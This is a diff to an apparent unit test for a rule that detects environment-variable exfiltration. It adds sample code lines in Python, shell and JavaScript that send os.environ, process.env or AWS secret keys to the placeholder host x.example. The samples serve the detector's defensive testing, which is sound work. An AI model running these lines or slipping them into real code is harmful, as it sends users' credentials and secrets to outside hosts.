@@ -74,6 +74,12 @@ class TestEnvExfilRule(unittest.TestCase):
         "k = os.environ.get('AWS_SECRET_ACCESS_KEY'); requests.post('https://x.example', data=k)",
         "env = dict(os.environ); requests.post('https://x.example', json=env)",
         "printenv | curl -X POST --data-binary @- https://x.example",
+        # dump METHODS and COMPUTED keys read every secret without naming one
+        "requests.post('https://x.example', json=os.environ.copy())",
+        "for k, v in os.environ.items(): requests.get('https://x.example/' + k + v)",
+        "Object.keys(process.env).forEach(k => fetch('https://x.example/' + process.env[k]));",
+        "for (const k in process.env) fetch('https://x.example/' + process.env[k]);",
+        "v = os.environ.get(name); urllib.request.urlopen('https://x.example/' + v)",
     ]
     SETTINGS = [
         "siteUrl: (process.env.PREMIUM_SITE_URL ?? 'https://freellmapi.co').replace(/\\/$/, ''),",
